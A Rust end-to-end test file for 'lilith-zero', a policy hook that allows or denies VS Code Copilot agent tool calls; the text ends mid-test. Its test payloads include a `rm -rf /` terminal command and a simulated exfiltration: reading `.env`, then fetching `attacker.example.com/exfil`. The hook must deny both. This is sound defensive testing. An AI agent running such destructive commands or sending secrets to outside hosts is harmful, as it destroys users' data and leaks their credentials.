//! End-to-end tests for the VS Code Copilot sidebar agent hook format.
//!
//! These tests invoke the real `lilith-zero` binary with `--format vscode`
//! and exercise the full stack: JSON parsing → policy evaluation → hookSpecificOutput
//! serialization. No mocking — the binary, persistence layer, and policy engine
//! all run exactly as they would in a developer's VS Code session.
//!
//! # What is validated
//!
//! - **Output structure**: `hookSpecificOutput` wrapper, all required and forbidden
//!   fields, correct types, no extra fields on allow.
//! - **VS Code tool names**: both real snake_case names (`read_file`, `run_in_terminal`,
//!   `fetch_webpage`, `insert_edit_into_file`) and camelCase aliases (`readFile`, etc.).
//! - **Fail-closed invariants**: malformed JSON, empty stdin, no policy, unknown
//!   tool all produce deny — never accidental allow.
//! - **Exit code**: always 0 (VS Code reads JSON, not exit code).
//! - **Single-line output**: VS Code parses the first line only.
//! - **PostToolUse**: different structure from PreToolUse.
//! - **Non-tool events**: SessionStart, SessionEnd, UserPromptSubmit produce
//!   generic `hookSpecificOutput` with the correct `hookEventName`.
//! - **Taint persistence**: taints set in one PreToolUse call are visible in the
//!   next call with the same `sessionId` (VS Code provides a stable ID per session).
//! - **Session isolation**: taints from session A do not bleed into session B.
//! - **Canonicalization**: `tool_name` with special characters (`#fetch`),
//!   nested `tool_input` JSON, absent `tool_input`, deeply nested args.
//! - **Field types**: `permissionDecision` is a string, not a boolean.
//!
//! # Test naming
//! `test_vscode_{tool_or_scenario}_{expected_outcome}`
//!
//! # Running
//! ```bash
//! cargo test --test vscode_hook_tests
//! ```

#![cfg(not(miri))]

use assert_cmd::Command;
use serde_json::Value;
use std::io::Write;
use std::path::{Path, PathBuf};
use tempfile::NamedTempFile;

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

fn bin() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_lilith-zero"))
}

fn write_policy(yaml: &str) -> NamedTempFile {
    let mut f = NamedTempFile::new().expect("temp policy");
    f.write_all(yaml.as_bytes()).expect("write policy");
    f
}

/// Parse stdout from the binary as JSON.
/// Panics with a useful message if the output is missing or malformed.
fn parse_output(raw: &[u8]) -> Value {
    let text = std::str::from_utf8(raw).expect("stdout must be UTF-8");
    let line = text
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or_else(|| panic!("no output on stdout — binary wrote nothing\nfull: {text}"));
    serde_json::from_str(line)
        .unwrap_or_else(|e| panic!("stdout is not valid JSON: {e}\nline: {line}"))
}

/// Run `lilith-zero hook --format vscode` with the given payload and policy.
/// VS Code embeds the event name in the JSON, so no `--event` flag is needed.
fn run_vscode(payload: &str, policy: &Path) -> assert_cmd::assert::Assert {
    Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy)
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
}

/// Build a PreToolUse payload using the SPEC format (camelCase fields).
/// VS Code Preview actually sends snake_case — use `pre_tool_real` for that.
fn pre_tool(session_id: &str, tool_name: &str, tool_input: Value) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": "PreToolUse",
        "transcript_path": "/tmp/transcript.json",
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_use_id": format!("tu-{tool_name}-001")
    })
    .to_string()
}

/// Build a PreToolUse payload using the REAL VS Code format (snake_case fields).
/// This matches what VS Code actually sends — confirmed from live hook logs:
///   hook_event_name, session_id, tool_name, tool_input (all snake_case)
///   transcript_path included, tool_use_id is a call_* prefixed UUID
fn pre_tool_real(session_id: &str, tool_name: &str, tool_input: Value) -> String {
    serde_json::json!({
        "timestamp": "2026-04-20T07:09:14.151Z",
        "cwd": "/workspace/my-project",
        "session_id": session_id,
        "hook_event_name": "PreToolUse",
        "transcript_path": "/home/user/.config/Code/User/workspaceStorage/abc123/GitHub.copilot-chat/transcripts/session.jsonl",
        "tool_name": tool_name,
        "tool_input": tool_input,
        "tool_use_id": format!("call_XwisUlf6s2Dv__vscode-1776668265338")
    })
    .to_string()
}

/// Build a PostToolUse payload.
fn post_tool(session_id: &str, tool_name: &str, output: Value) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:01.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": "PostToolUse",
        "tool_name": tool_name,
        "tool_input": {},
        "tool_output": output,
        "tool_use_id": format!("tu-{tool_name}-001")
    })
    .to_string()
}

/// Build a non-tool lifecycle event payload.
fn lifecycle_event(session_id: &str, event: &str) -> String {
    serde_json::json!({
        "timestamp": "2026-04-19T12:00:00.000Z",
        "cwd": "/workspace/my-project",
        "sessionId": session_id,
        "hookEventName": event
    })
    .to_string()
}

/// Clean up any session file that might have been created during a test.
fn cleanup_session(session_id: &str) {
    let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
    let path = PathBuf::from(home)
        .join(".lilith/sessions")
        .join(format!("{session_id}.json"));
    let _ = std::fs::remove_file(path);
}

// ---------------------------------------------------------------------------
// Policy fixtures
// ---------------------------------------------------------------------------

/// Standard VS Code policy.
/// Includes BOTH real snake_case names (as VS Code actually sends) and
/// camelCase aliases (spec format), so tests work with either payload format.
fn vscode_policy() -> &'static str {
    r##"
id: vscode-e2e-policy
customer_id: enterprise-test
name: VS Code E2E Test Policy
version: 1
static_rules:
  # Real names VS Code sends (snake_case — confirmed from live hook logs)
  read_file: ALLOW
  insert_edit_into_file: ALLOW
  create_file: ALLOW
  find_files: ALLOW
  search: ALLOW
  get_errors: ALLOW
  fetch_webpage: ALLOW
  # camelCase aliases (spec format / older hooks)
  editFiles: ALLOW
  createFile: ALLOW
  readFile: ALLOW
  searchFiles: ALLOW
  "#fetch": ALLOW
  # Denied operations
  run_in_terminal: DENY
  runTerminalCommand: DENY
  delete_file: DENY
  deleteFile: DENY
  push_to_github: DENY
  pushToGitHub: DENY
taint_rules: []
resource_rules: []
"##
}

/// Policy using real VS Code tool names for taint propagation tests.
/// Confirmed from live testing: read_file adds taint, fetch_webpage is blocked.
fn taint_policy() -> &'static str {
    r##"
id: vscode-taint-policy
customer_id: test
name: VS Code Taint Test Policy
version: 1
static_rules:
  # Real snake_case names (live-confirmed)
  read_file: ALLOW
  fetch_webpage: ALLOW
  run_in_terminal: ALLOW
  insert_edit_into_file: ALLOW
  # camelCase aliases
  readFile: ALLOW
  "#fetch": ALLOW
  runTerminalCommand: ALLOW
taint_rules:
  - tool: read_file
    action: ADD_TAINT
    tag: SENSITIVE_READ
  - tool: readFile
    action: ADD_TAINT
    tag: SENSITIVE_READ
  - tool: fetch_webpage
    action: CHECK_TAINT
    required_taints: ["SENSITIVE_READ"]
    error: "exfiltration blocked: web fetch after file read"
  - tool: "#fetch"
    action: CHECK_TAINT
    required_taints: ["SENSITIVE_READ"]
    error: "exfiltration blocked: web fetch after file read"
resource_rules: []
"##
}

// ===========================================================================
// 1. OUTPUT STRUCTURE VALIDATION
// ===========================================================================

/// Every PreToolUse response must have the hookSpecificOutput wrapper.
#[test]
fn test_vscode_output_has_hook_specific_output_wrapper() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-struct-1",
        "editFiles",
        serde_json::json!({"files": ["a.rs"]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert!(
        json.get("hookSpecificOutput").is_some(),
        "output must have top-level 'hookSpecificOutput' key, got: {json}"
    );
}

/// hookSpecificOutput.hookEventName must be "PreToolUse" for pre-tool events.
#[test]
fn test_vscode_output_hook_event_name_is_pre_tool_use() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool("s-struct-2", "editFiles", serde_json::json!({}));
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PreToolUse"),
        "hookEventName must be 'PreToolUse'"
    );
}

/// permissionDecision must be a string, never a boolean.
#[test]
fn test_vscode_permission_decision_is_string_not_boolean() {
    let policy = write_policy(vscode_policy());
    for tool in &["editFiles", "runTerminalCommand"] {
        let payload = pre_tool("s-type-1", tool, serde_json::json!({}));
        let out = run_vscode(&payload, policy.path())
            .success()
            .get_output()
            .stdout
            .clone();
        let json = parse_output(&out);
        let decision = &json["hookSpecificOutput"]["permissionDecision"];
        assert!(
            decision.is_string(),
            "permissionDecision must be a string (not bool/number), got: {decision} for tool {tool}"
        );
    }
}

/// Allow response must NOT contain permissionDecisionReason or additionalContext.
#[test]
fn test_vscode_allow_has_no_extra_fields() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-allow-1",
        "editFiles",
        serde_json::json!({"files": ["x.rs"]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    let specific = &json["hookSpecificOutput"];
    assert!(
        specific.get("permissionDecisionReason").is_none(),
        "allow must NOT include permissionDecisionReason, got: {json}"
    );
    assert!(
        specific.get("additionalContext").is_none(),
        "allow must NOT include additionalContext, got: {json}"
    );
}

/// Deny response MUST include permissionDecisionReason and additionalContext.
#[test]
fn test_vscode_deny_has_required_fields() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-deny-1",
        "runTerminalCommand",
        serde_json::json!({"command": "ls"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    let specific = &json["hookSpecificOutput"];

    let reason = specific["permissionDecisionReason"].as_str();
    assert!(
        reason.is_some() && !reason.unwrap().is_empty(),
        "deny must include non-empty permissionDecisionReason, got: {json}"
    );
    let context = specific["additionalContext"].as_str();
    assert!(
        context.is_some() && !context.unwrap().is_empty(),
        "deny must include non-empty additionalContext (shown to the LLM), got: {json}"
    );
}

/// Output must be exactly one non-empty line — VS Code parses the first line only.
#[test]
fn test_vscode_output_is_single_line() {
    let policy = write_policy(vscode_policy());
    for (tool, desc) in &[("editFiles", "allow"), ("runTerminalCommand", "deny")] {
        let payload = pre_tool("s-line-1", tool, serde_json::json!({}));
        let out = run_vscode(&payload, policy.path())
            .success()
            .get_output()
            .stdout
            .clone();
        let text = std::str::from_utf8(&out).unwrap();
        let non_empty: Vec<&str> = text.lines().filter(|l| !l.trim().is_empty()).collect();
        assert_eq!(
            non_empty.len(),
            1,
            "stdout must have exactly 1 non-empty line for {desc} ({tool}), got {}: {:?}",
            non_empty.len(),
            non_empty
        );
    }
}

/// Exit code must always be 0 — VS Code reads JSON stdout, never exit codes.
#[test]
fn test_vscode_exit_code_always_zero_on_deny() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-exit-1",
        "runTerminalCommand",
        serde_json::json!({"command": "whoami"}),
    );
    run_vscode(&payload, policy.path()).success(); // assert_cmd: success() = exit 0
}

#[test]
fn test_vscode_exit_code_always_zero_on_allow() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-exit-2",
        "editFiles",
        serde_json::json!({"files": ["lib.rs"]}),
    );
    run_vscode(&payload, policy.path()).success();
}

// ===========================================================================
// 2. VS CODE TOOL NAMES — ALLOW / DENY PER POLICY
// ===========================================================================

#[test]
fn test_vscode_edit_files_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-edit-1",
        "editFiles",
        serde_json::json!({"files": ["src/main.rs"], "edits": [{"range": {"start": {"line": 1}}, "newText": "fn main() {}"}]}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "editFiles must be allowed"
    );
}

#[test]
fn test_vscode_create_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-create-1",
        "createFile",
        serde_json::json!({"path": "src/new_module.rs", "content": "pub fn hello() {}"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "createFile must be allowed"
    );
}

#[test]
fn test_vscode_read_file_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-read-1",
        "readFile",
        serde_json::json!({"path": "src/main.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "readFile must be allowed"
    );
}

#[test]
fn test_vscode_search_files_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-search-1",
        "searchFiles",
        serde_json::json!({"query": "TODO", "include": "**/*.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "searchFiles must be allowed"
    );
}

/// #fetch (web fetch) contains a hash in the tool name — must be handled without panic.
#[test]
fn test_vscode_fetch_tool_with_hash_in_name_allowed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-fetch-1",
        "#fetch",
        serde_json::json!({"url": "https://api.example.com/data", "method": "GET"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "#fetch must be allowed"
    );
}

#[test]
fn test_vscode_run_terminal_command_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-term-1",
        "runTerminalCommand",
        serde_json::json!({"command": "echo hello"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "runTerminalCommand must be denied"
    );
}

#[test]
fn test_vscode_run_terminal_dangerous_command_denied() {
    let policy = write_policy(vscode_policy());
    // rm -rf / — must be denied before execution
    let payload = pre_tool(
        "t-term-2",
        "runTerminalCommand",
        serde_json::json!({"command": "rm -rf /", "cwd": "/"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "rm -rf / must be denied"
    );
}

#[test]
fn test_vscode_delete_file_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-del-1",
        "deleteFile",
        serde_json::json!({"path": "src/important.rs"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "deleteFile must be denied"
    );
}

#[test]
fn test_vscode_push_to_github_denied() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "t-push-1",
        "pushToGitHub",
        serde_json::json!({"branch": "main", "message": "feat: add feature"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "pushToGitHub must be denied"
    );
}

// ===========================================================================
// 3. FAIL-CLOSED INVARIANTS
// ===========================================================================

/// Malformed JSON on stdin must deny — never accidentally allow on parse failure.
#[test]
fn test_vscode_malformed_json_fails_closed() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"{ this is not valid json !!!".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "malformed JSON must fail-closed with deny"
    );
}

/// Empty stdin must emit a neutral unknown-event response and exit 0.
///
/// VS Code cannot have sent a tool event with no payload — we can't know what event
/// to mirror, so we emit a generic "Unknown" response. VS Code ignores outputs for
/// non-tool events, and this is safer than hardcoding a mismatched "PreToolUse" deny.
#[test]
fn test_vscode_empty_stdin_emits_unknown_event_response() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("Unknown"),
        "empty stdin must emit hookEventName=Unknown"
    );
    assert!(
        json["hookSpecificOutput"]["permissionDecision"].is_null(),
        "empty stdin must not include permissionDecision (no tool event)"
    );
}

/// Whitespace-only stdin must also emit a neutral unknown-event response.
#[test]
fn test_vscode_whitespace_only_stdin_emits_unknown_event_response() {
    let policy = write_policy(vscode_policy());
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(b"   \n\t  \n".to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("Unknown"),
        "whitespace-only stdin must emit hookEventName=Unknown"
    );
}

/// No policy loaded → deny all (fail-closed BlockParams mode).
#[test]
fn test_vscode_no_policy_denies_all_tools_fail_closed() {
    // No --policy flag — engine runs with no policy, must deny everything
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode"])
        .write_stdin(
            pre_tool("s-nopol-1", "editFiles", serde_json::json!({}))
                .as_bytes()
                .to_vec(),
        )
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "no policy must deny all tools (fail-closed)"
    );
}

/// Tool not in policy → deny (fail-closed, deny-by-default).
#[test]
fn test_vscode_unknown_tool_denied_fail_closed() {
    let policy = write_policy(vscode_policy());
    let payload = pre_tool(
        "s-unk-1",
        "someUnknownFutureTool",
        serde_json::json!({"arg": "value"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "tool not in policy must be denied (fail-closed)"
    );
}

/// Missing `sessionId` is valid — VS Code Preview sometimes omits it.
/// The session ID is derived from `cwd` in this case, and the tool call
/// proceeds to normal policy evaluation (allow/deny based on tool name).
#[test]
fn test_vscode_missing_session_id_falls_back_to_cwd_derived_session() {
    let policy = write_policy(vscode_policy());
    // No sessionId — valid in VS Code Preview builds
    let payload = r#"{"cwd":"/workspace","hookEventName":"PreToolUse","tool_name":"read_file","tool_input":{}}"#;
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    // read_file is ALLOW in the policy — absence of sessionId must NOT fail-closed
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "missing sessionId must fall back to cwd-derived session and evaluate normally"
    );
}

// ===========================================================================
// 4. POST-TOOL-USE OUTPUT STRUCTURE
// ===========================================================================

/// PostToolUse output must use hookEventName "PostToolUse" in the wrapper.
#[test]
fn test_vscode_post_tool_use_output_structure() {
    let policy = write_policy(vscode_policy());
    let payload = post_tool(
        "s-post-1",
        "editFiles",
        serde_json::json!({"status": "success", "linesChanged": 5}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PostToolUse"),
        "PostToolUse response must echo 'PostToolUse' in hookEventName"
    );
    // PostToolUse allow must NOT have a "decision" field
    assert!(
        json.get("decision").is_none(),
        "PostToolUse allow must not include 'decision' field, got: {json}"
    );
}

/// PostToolUse exit code must also be 0.
#[test]
fn test_vscode_post_tool_use_exits_zero() {
    let policy = write_policy(vscode_policy());
    let payload = post_tool(
        "s-post-2",
        "runTerminalCommand",
        serde_json::json!({"output": "hello"}),
    );
    run_vscode(&payload, policy.path()).success();
}

/// PostToolUse for a denied tool still runs (for taint propagation) and returns allow.
#[test]
fn test_vscode_post_tool_use_for_denied_tool_returns_allow_structure() {
    let policy = write_policy(vscode_policy());
    // PostToolUse fires after the tool ran; even for "denied" tools in the policy,
    // PostToolUse output is informational and always returns allow structure.
    let payload = post_tool(
        "s-post-3",
        "runTerminalCommand",
        serde_json::json!({"stdout": "hello world"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("PostToolUse"),
        "PostToolUse must have correct hookEventName"
    );
}

// ===========================================================================
// 5. LIFECYCLE EVENTS (SessionStart, SessionEnd, UserPromptSubmit)
// ===========================================================================

/// SessionStart must produce a generic hookSpecificOutput with hookEventName="SessionStart".
#[test]
fn test_vscode_session_start_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-sess-1", "SessionStart");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionStart"),
        "SessionStart must echo hookEventName in output"
    );
}

#[test]
fn test_vscode_session_end_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-sess-2", "SessionEnd");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("SessionEnd")
    );
}

#[test]
fn test_vscode_user_prompt_submit_produces_correct_output() {
    let policy = write_policy(vscode_policy());
    let payload = lifecycle_event("s-prompt-1", "UserPromptSubmit");
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["hookEventName"].as_str(),
        Some("UserPromptSubmit")
    );
}

// ===========================================================================
// 6. SESSION IDENTITY — sessionId from payload (not derived from cwd)
// ===========================================================================

/// VS Code provides sessionId directly. Two calls with the same sessionId must
/// share state. Two different sessionIds must be isolated.
#[test]
fn test_vscode_session_id_used_directly_from_payload() {
    // The session ID must come from the payload's `sessionId` field,
    // not derived from `cwd`. Verify by using two distinct sessionIds
    // pointing to the same cwd — they must have independent taint state.
    let session_a = "vsc-shard-a-e2e-001";
    let session_b = "vsc-shard-b-e2e-001";
    cleanup_session(session_a);
    cleanup_session(session_b);

    let policy_yaml = r#"
id: session-id-test
customer_id: test
name: Session ID Test
version: 1
static_rules:
  taint_tool: ALLOW
  check_tool: ALLOW
taint_rules:
  - tool: taint_tool
    action: ADD_TAINT
    tag: SESSION_MARKER
  - tool: check_tool
    action: CHECK_TAINT
    required_taints: ["SESSION_MARKER"]
    error: "blocked when SESSION_MARKER active"
resource_rules: []
"#;
    let policy = write_policy(policy_yaml);

    // Taint session A
    let taint_payload = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_a,
        "hookEventName": "PreToolUse",
        "tool_name": "taint_tool",
        "tool_input": {}
    })
    .to_string();
    run_vscode(&taint_payload, policy.path()).success();

    // Session A must be blocked for check_tool (taint active)
    let check_a = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_a,
        "hookEventName": "PreToolUse",
        "tool_name": "check_tool",
        "tool_input": {}
    })
    .to_string();
    let out_a = run_vscode(&check_a, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_a)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "session A must be denied (SESSION_MARKER active)"
    );

    // Session B (same cwd, different sessionId) must NOT be blocked
    let check_b = serde_json::json!({
        "cwd": "/same/workspace",
        "sessionId": session_b,
        "hookEventName": "PreToolUse",
        "tool_name": "check_tool",
        "tool_input": {}
    })
    .to_string();
    let out_b = run_vscode(&check_b, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out_b)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "session B must be allowed — SESSION_MARKER from A must not bleed into B"
    );

    cleanup_session(session_a);
    cleanup_session(session_b);
}

// ===========================================================================
// 7. TAINT TRACKING — LETHAL TRIFECTA SIMULATION
// ===========================================================================

/// readFile adds SENSITIVE_READ taint; a subsequent #fetch in the same session
/// must be blocked (simulates the exfiltration pattern).
#[test]
fn test_vscode_taint_exfiltration_pattern_blocked() {
    let session = "vsc-taint-exfil-e2e-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());

    // Step 1: readFile → adds SENSITIVE_READ taint
    let read_payload = pre_tool(session, "readFile", serde_json::json!({"path": ".env"}));
    let read_out = run_vscode(&read_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&read_out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "readFile must be allowed (it adds a taint)"
    );

    // Step 2: #fetch → must be blocked because SENSITIVE_READ is now active
    let fetch_payload = pre_tool(
        session,
        "#fetch",
        serde_json::json!({"url": "https://attacker.example.com/exfil"}),
    );
    let fetch_out = run_vscode(&fetch_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&fetch_out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "#fetch must be denied after readFile — exfiltration pattern blocked"
    );

    cleanup_session(session);
}

/// Without the taint trigger (no readFile), #fetch must be allowed.
#[test]
fn test_vscode_fetch_allowed_without_prior_sensitive_read() {
    let session = "vsc-taint-clean-e2e-001";
    cleanup_session(session);

    let policy = write_policy(taint_policy());
    let payload = pre_tool(
        session,
        "#fetch",
        serde_json::json!({"url": "https://docs.example.com"}),
    );
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
        parse_output(&out)["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "#fetch must be allowed when no SENSITIVE_READ taint is active"
    );

    cleanup_session(session);
}

// ===========================================================================
// 8. CANONICALIZATION & EDGE CASES
// ===========================================================================

/// tool_input absent (null) — must not crash, policy evaluation must proceed.
#[test]
fn test_vscode_null_tool_input_does_not_crash() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-null-1",
        "hookEventName": "PreToolUse",
        "tool_name": "editFiles"
        // tool_input deliberately absent
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    // Must produce valid JSON regardless
    let json = parse_output(&out);
    assert!(
        json["hookSpecificOutput"]["permissionDecision"]
            .as_str()
            .is_some(),
        "must produce a permissionDecision even with absent tool_input"
    );
}

/// Deeply nested tool_input — must parse and evaluate correctly without truncation.
#[test]
fn test_vscode_deeply_nested_tool_input_handled() {
    let policy = write_policy(vscode_policy());
    let nested = serde_json::json!({
        "files": ["a.rs", "b.rs"],
        "edits": [
            {"range": {"start": {"line": 1, "character": 0}, "end": {"line": 5, "character": 80}}, "newText": "fn main() {}\n"},
            {"range": {"start": {"line": 10, "character": 0}, "end": {"line": 15, "character": 0}}, "newText": "// comment\n"}
        ],
        "metadata": {"author": "copilot", "reason": "refactor", "tags": ["safe", "reviewed"]}
    });
    let payload = pre_tool("s-nested-1", "editFiles", nested);
    let out = run_vscode(&payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("allow"),
        "editFiles with deeply nested input must be allowed"
    );
}

/// Empty string tool_name — must not crash, must fail-closed (not in policy).
#[test]
fn test_vscode_empty_tool_name_fails_closed() {
    let policy = write_policy(vscode_policy());
    let payload = serde_json::json!({
        "cwd": "/workspace",
        "sessionId": "s-empty-tool-1",
        "hookEventName": "PreToolUse",
        "tool_name": "",
        "tool_input": {}
    })
    .to_string();
    let out = Command::new(bin())
        .args(["hook", "--format", "vscode", "--policy"])
        .arg(policy.path())
        .write_stdin(payload.as_bytes().to_vec())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();
    let json = parse_output(&out);
    assert_eq!(
        json["hookSpecificOutput"]["permissionDecision"].as_str(),
        Some("deny"),
        "empty tool_name not in policy must be denied (fail-closed)"
    );
}

/// tool_name with dots (e.g. MCP tools like `github.create_issue`) must parse correctly.
#[test]
fn test_vscode_mcp_style_dotted_tool_name_evaluated() {
    // MCP tools often use dotted namespacing: "server.tool_name"
    let policy_yaml = r#"
id: mcp-tool-test
customer_id: test
name: MCP Tool Test
version: 1
static_rules:
  "github.create_issue": ALLOW
  "github.delete_repo": DENY
taint_rules: []
resource_rules: []
"#;
    let policy = write_policy(policy_yaml);

    let allow_payload = pre_tool(
        "s-mcp-1",
        "github.create_issue",
        serde_json::json!({"title": "Bug", "body": "Found a bug"}),
    );
    let out_allow = run_vscode(&allow_payload, policy.path())
        .success()
        .get_output()
        .stdout
        .clone();
    assert_eq!(
